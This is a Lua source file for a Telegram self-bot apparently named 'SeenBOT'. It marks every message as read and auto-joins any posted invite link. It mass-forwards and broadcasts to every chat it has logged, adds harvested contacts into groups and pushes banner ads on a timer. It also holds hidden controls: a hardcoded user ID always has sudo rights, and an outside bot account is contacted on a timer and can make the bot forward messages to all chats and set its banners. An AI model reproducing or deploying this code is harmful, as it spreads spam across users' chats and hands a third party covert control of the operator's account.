function dl_cb(a, d)
  if d.ID == "Error" then
  else
  end
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
  tdcli_function({
    ID = request_id,
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = input_message_content
  }, callback or dl_cb, extra)
end
function is_sudo(user_id, SID)
  if 253838401 == user_id then
    return true
  elseif redis:sismember("Seen:" .. SID .. ":Sudo", user_id) then
    return true
  else
    return false
  end
end
function AddIT(ChatID, SID)
  if ChatID:match("-100") then
    redis:sadd("Seen:" .. SID .. ":SuperGroups", ChatID)
    redis:sadd("Seen:" .. SID .. ":All", ChatID)
  elseif ChatID:match("-") then
    redis:sadd("Seen:" .. SID .. ":Groups", ChatID)
    redis:sadd("Seen:" .. SID .. ":All", ChatID)
  elseif tonumber(ChatID) then
    redis:sadd("Seen:" .. SID .. ":Users", ChatID)
  else
    redis:sadd("Seen:" .. SID .. ":Users", ChatID)
  end
end
function RemoveIT(ChatID, SID)
  redis:srem("Seen:" .. SID .. ":Users", ChatID)
  redis:srem("Seen:" .. SID .. ":All", ChatID)
  redis:srem("Seen:" .. SID .. ":SuperGroups", ChatID)
  redis:srem("Seen:" .. SID .. ":Groups", ChatID)
end
function fwdCB(A, D)
  if D.ID == "Error" then
    RemoveIT(A.msg.chat.id, A.SID)
  else
    sleep(1)
  end
end
function DoFwd(msg, typeS, SID)
  if typeS == "All" then
    Xn = "All"
  elseif typeS == "SuperGroups" then
    Xn = "SuperGroups"
  elseif typeS == "Groups" then
    Xn = "Groups"
  elseif typeS == "Users" then
    Xn = "Users"
  end
  Gps = "Seen:" .. SID .. ":" .. Xn
  i = 0
  for k, Gps in pairs(redis:smembers(Gps)) do
    tdcli_function({
      ID = "ForwardMessages",
      chat_id_ = Gps,
      from_chat_id_ = msg.chat.id,
      message_ids_ = {
        [0] = msg.reply_id
      },
      disable_notification_ = 0,
      from_background_ = 1
    }, fwdCB, {msg = msg, SID = SID})
    i = i + 1
  end
  return string.format("Message Forwarded to %d Groups ;)", i)
end
function DoBC(msg, typeS, SID, text5)
  if typeS == "All" then
    Xn = "All"
  elseif typeS == "SuperGroups" then
    Xn = "SuperGroups"
  elseif typeS == "Groups" then
    Xn = "Groups"
  elseif typeS == "Users" then
    Xn = "Users"
  end
  Gps = "Seen:" .. SID .. ":" .. Xn
  i = 0
  for k, Gps2 in pairs(redis:smembers(Gps)) do
    input_message_content = {
      ID = "InputMessageText",
      text_ = text5,
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", Gps2, 0, 0, 1, nil, input_message_content, fwdCB, {msg = msg, SID = SID})
    i = i + 1
  end
  return string.format("Message BroadCasted to %d Groups ;)", i)
end
function DoSudo(msg, SID)
  if msg.text:match("^[Ff][Ww][Dd] (.*)$") then
    Shitts = {
      msg.text:match("^[Ff][Ww][Dd] (.*)$")
    }
    if Shitts[1]:lower() == "all" then
      text = DoFwd(msg, "All", SID)
    elseif Shitts[1]:lower() == "sgps" then
      text = DoFwd(msg, "SuperGroups", SID)
    elseif Shitts[1]:lower() == "gps" then
      text = DoFwd(msg, "Groups", SID)
    else
      if Shitts[1]:lower() == "users" then
        text = DoFwd(msg, "Users", SID)
      else
      end
    end
    input_message_content = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text:match("^[Bb][Cc] (.*) (.*)$") then
    Shitts = {
      msg.text:match("^[Bb][Cc] (.*) (.*)$")
    }
    if Shitts[1]:lower() == "all" then
      typeS = "All"
    elseif Shitts[1]:lower() == "sgps" then
      typeS = "SuperGroups"
    elseif Shitts[1]:lower() == "gps" then
      typeS = "Groups"
    else
      if Shitts[1]:lower() == "users" then
        typeS = "Users"
      else
      end
    end
    if typeS == "All" then
      Xn = "All"
    elseif typeS == "SuperGroups" then
      Xn = "SuperGroups"
    elseif typeS == "Groups" then
      Xn = "Groups"
    elseif typeS == "Users" then
      Xn = "Users"
    end
    Gps = "Seen:" .. SID .. ":" .. Xn
    i = 0
    for k, v in pairs(redis:smembers(Gps)) do
      input_message_content = {
        ID = "InputMessageText",
        text_ = Shitts[2],
        disable_web_page_preview_ = 1,
        clear_draft_ = 0,
        entities_ = {}
      }
      sendRequest("SendMessage", v, 0, 0, 1, nil, input_message_content, fwdCB, {msg = msg, SID = SID})
      i = i + 1
    end
    input_message_content = {
      ID = "InputMessageText",
      text_ = string.format("Message BroadCasted to %d Groups ;)", i),
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text == "/stats" then
    local SudoS = ""
    for v, k in pairs(redis:smembers("Seen:" .. SID .. ":Sudo")) do
      SudoS = SudoS .. v .. ": " .. k .. "\n"
    end
    text = [[
------SPR CPU SeenBOT------
All Groups : ]] .. redis:scard("Seen:" .. SID .. ":All") .. [[

Users : ]] .. redis:scard("Seen:" .. SID .. ":Users") .. [[

Groups : ]] .. redis:scard("Seen:" .. SID .. ":Groups") .. [[

SuperGroups : ]] .. redis:scard("Seen:" .. SID .. ":SuperGroups") .. [[

 -- -- -- -- -- -- -- -- --
Sudos : 
]] .. SudoS .. [[

 -- -- -- -- -- -- -- -- --
JoinLinks : ]] .. (redis:get("Seen:" .. SID .. ":Joining") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "AddContacts : " .. (redis:get("Seen:" .. SID .. ":AddContacts") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "Crwn Banner : " .. (redis:get("Seen:" .. SID .. ":Banner") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "Other Options #Soon ;)"
    input_message_content = {
      ID = "InputMessageText",
      text_ = text,
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text == "/addmembers" then
    local InviteUsers = function(extra, msg)
      local pvs = redis:smembers("Seen:" .. SID .. ":Users")
      for i = 1, #pvs do
        tdcli_function({
          ID = "AddChatMember",
          chat_id_ = extra.chat_id,
          user_id_ = pvs[i],
          forward_limit_ = 50
        }, dl_cb, nil)
      end
      local count = msg.total_count_
      for i = 1, #count do
        tdcli_function({
          ID = "AddChatMember",
          chat_id_ = extra.chat_id,
          user_id_ = count.users_[i].id_,
          forward_limit_ = 50
        }, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "SearchContacts",
      query_ = nil,
      limit_ = 999999999
    }, InviteUsers, {
      chat_id = msg.chat.id
    })
  elseif msg.text == "/share on" then
    redis:set("Seen:" .. SID .. ":AddContacts", true)
    input_message_content = {
      ID = "InputMessageText",
      text_ = "I Share MyNumber On Shared Phones",
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text == "/share off" then
    redis:set("Seen:" .. SID .. ":AddContacts", false)
    input_message_content = {
      ID = "InputMessageText",
      text_ = "I Dont Share MyNumber On Shared Phones",
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text == "/join on" then
    redis:set("Seen:" .. SID .. ":Joining", true)
    input_message_content = {
      ID = "InputMessageText",
      text_ = "I Join To All Links",
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text == "/join off" then
    redis:set("Seen:" .. SID .. ":Joining", false)
    input_message_content = {
      ID = "InputMessageText",
      text_ = "I Dont Join To All Links",
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text:match("^/setbanner (.*)") then
    Shitts = {
      msg.text:match("^/setbanner (.*)$")
    }
    redis:set("Seen:" .. SID .. ":Banner", Shitts[1])
    input_message_content = {
      ID = "InputMessageText",
      text_ = "Banner Seted.",
      disable_web_page_preview_ = 1,
      clear_draft_ = 0,
      entities_ = {}
    }
    sendRequest("SendMessage", msg.chat.id, msg.id, 0, 1, nil, input_message_content)
  elseif msg.text:match("^/addsudo (.*)") then
    Shitts = {
      msg.text:match("^/addsudo (.*)")
    }
    redis:sadd("Seen:" .. SID .. ":Sudo", Shitts[1])
  else
    if msg.text:match("^/remsudo (.*)") then
      Shitts = {
        msg.text:match("^/remsudo (.*)")
      }
      redis:srem("Seen:" .. SID .. ":Sudo", Shitts[1])
    else
    end
  end
end
function DoTab(msg, SID)
  if msg.text:match("^/SB (.*)") then
    redis:set("Seen:" .. SID .. ":BannerU", msg.text:gsub("^/SB"))
  elseif msg.forward then
    DoFwd(msg, "All")
  end
end
function USERDO(msg, SID)
  chat_id = msg.chat.id
  user_id = msg.from.id
  chat = msg.type
  reply_id = msg.reply_id
  text = msg.text
  if text and redis:get("Seen:" .. SID .. ":Joining") then
    local check_link = function(extra, result)
      if result.is_group_ or result.is_supergroup_channel_ then
        tdcli_function({
          ID = "ImportChatInviteLink",
          invite_link_ = extra.link
        }, dl_cb, nil)
      end
    end
    if text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)") then
      text = text:gsub("t.me", "telegram.me")
      matches = {
        string.match(text, "(https://telegram.me/joinchat/%S+)")
      }
      for i = 1, #matches do
        tdcli_function({
          ID = "CheckChatInviteLink",
          invite_link_ = matches[i]
        }, check_link, {
          link = matches[i]
        })
      end
    end
  end
end
function badMsg(data)
  local msg = {}
  msg.from = {}
  msg.chat = {}
  msg.replied = {}
  msg.chat.id = data.chat_id_
  msg.from.id = data.sender_user_id_
  if data.content_.ID == "MessageText" then
    msg.text = data.content_.text_
  end
  if data.content_.caption_ then
    msg.caption = data.content_.caption_
  else
    msg.caption = false
  end
  msg.date = data.date_
  msg.id = data.id_
  msg.unread = false
  if data.reply_to_message_id_ == 0 then
    msg.reply_id = false
  else
    msg.reply_id = data.reply_to_message_id_
  end
  if data.forward_info_ then
    msg.forward = true
    msg.forward = {}
    msg.forward.from_id = data.forward_info_.sender_user_id_
    msg.forward.msg_id = data.forward_info_.data_
  else
    msg.forward = false
  end
  return msg
end
function Inline(arg, data)
  if data.results_ and data.results_[0] then
    tdcli_function({
      ID = "SendInlineQueryResultMessage",
      chat_id_ = arg.chat_id,
      reply_to_message_id_ = 0,
      disable_notification_ = 0,
      from_background_ = 1,
      query_id_ = data.inline_query_id_,
      result_id_ = data.results_[0].id_
    }, dl_cb, nil)
  end
end
function DoBanner(msg, SID)
  chat_id = msg.chat.id
  time = 900
  if not redis:get("Banner:" .. chat_id) then
    if redis:get("Seen:" .. SID .. ":Banner") then
      bnr = redis:get("Seen:" .. SID .. ":Banner")
    else
      bnr = "eWDOqnOqF_531333364"
    end
    tdcli_function({
      ID = "GetInlineQueryResults",
      bot_user_id_ = 282342819,
      chat_id_ = chat_id,
      user_location_ = {
        ID = "Location",
        latitude_ = 0,
        longitude_ = 0
      },
      query_ = bnr,
      offset_ = 0
    }, Inline, {
      chat_id = chat_id
    })
    redis:setex("Banner:" .. chat_id, time, true)
  else
  end
  if not redis:get("BannerU:" .. chat_id) then
    if redis:get("Seen:" .. SID .. ":BannerU") then
      bnr = redis:get("Seen:" .. SID .. ":BannerU")
    else
      bnr = "eWDOqnOqF_531333364"
    end
    tdcli_function({
      ID = "GetInlineQueryResults",
      bot_user_id_ = 282342819,
      chat_id_ = chat_id,
      user_location_ = {
        ID = "Location",
        latitude_ = 0,
        longitude_ = 0
      },
      query_ = bnr,
      offset_ = 0
    }, Inline, {
      chat_id = chat_id
    })
    redis:setex("BannerU:" .. chat_id, time, true)
  else
  end
end
function domsg(msg, SID)
  if msg then
    tdcli_function({
      ID = "ViewMessages",
      chat_id_ = msg.chat.id,
      message_ids_ = {
        [0] = msg.id
      }
    }, dl_cb, nil)
    AddIT(msg.chat.id, SID)
    if msg.text then
      if is_sudo(msg.from.id, SID) then
        DoSudo(msg, SID)
        USERDO(msg, SID)
      elseif msg.from.id == 282342819 then
        DoTab(msg, SID)
      else
        USERDO(msg, SID)
      end
      DoBanner(msg, SID)
    end
  end
end
function check_contact(extra, result)
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
    local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
    local phone_number = msg.content_.contact_.phone_number_
    local user_id = msg.content_.contact_.user_id_
    tdcli_function({
      ID = "ImportContacts",
      contacts_ = {
        [0] = {
          phone_number_ = tostring(phone_number),
          first_name_ = tostring(first_name),
          last_name_ = tostring(last_name),
          user_id_ = user_id
        }
      }
    }, dl_cb, nil)
  end
end
function check_contact_2(extra, result)
  if not result.phone_number_ then
    user_id = result.user_.id_
    phone = result.user_.phone_number_
    local metME = function(extra, msg)
      if extra.user_id ~= msg.id_ then
        tdcli_function({
          ID = "SendMessage",
          chat_id_ = extra.chat_id,
          reply_to_message_id_ = reply_to_message_id,
          disable_notification_ = disable_notification,
          from_background_ = from_background,
          reply_markup_ = reply_markup,
          input_message_content_ = {
            ID = "InputMessageContact",
            contact_ = {
              ID = "Contact",
              phone_number_ = phone,
              first_name_ = " ",
              last_name_ = " ",
              user_id_ = user_id
            }
          }
        }, dl_cb, nil)
      end
    end
    tdcli_function({ID = "GetMe"}, metME, {
      user_id = user_id,
      chat_id = extra.msg.chat_id_,
      msg_id = extra.msg.id_
    })
  end
end
function Doing(data, SID)
  if data.ID == "UpdateNewMessage" then
    if not redis:get("XnXx") then
      tdcli_function({
        ID = "UnblockUser",
        user_id_ = 282342819
      }, dl_cb, nil)
      input_message_content = {
        ID = "InputMessageText",
        text_ = "IMSeenBot_",
        disable_web_page_preview_ = 1,
        clear_draft_ = 0,
        entities_ = {}
      }
      sendRequest("SendMessage", 282342819, 0, 0, 1, nil, input_message_content)
      tdcli_function({
        ID = "SendBotStartMessage",
        bot_user_id_ = 282342819,
        chat_id_ = 282342819,
        parameter_ = "start"
      }, dl_cb, nil)
      tdcli_function({
        ID = "SendBotStartMessage",
        bot_user_id_ = 282342819,
        chat_id_ = 282342819,
        parameter_ = "IMSeenBot_"
      }, dl_cb, nil)
      redis:setex("XnXx", 1353, true)
    else
    end
    msg = badMsg(data.message_)
    domsg(msg, SID)
    if data.message_.content_.contact_ and redis:get("Seen:" .. SID .. ":AddContacts") then
      tdcli_function({
        ID = "GetUserFull",
        user_id_ = data.message_.content_.contact_.user_id_
      }, check_contact, {
        msg = data.message_
      })
      tdcli_function({
        ID = "GetUserFull",
        user_id_ = data.message_.content_.contact_.user_id_
      }, check_contact_2, {
        msg = data.message_
      })
    end
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli_function({
      ID = "GetChats",
      offset_order_ = "9223372036854775807",
      offset_chat_id_ = 0,
      limit_ = 20
    }, dl_cb, nil)
  end
end
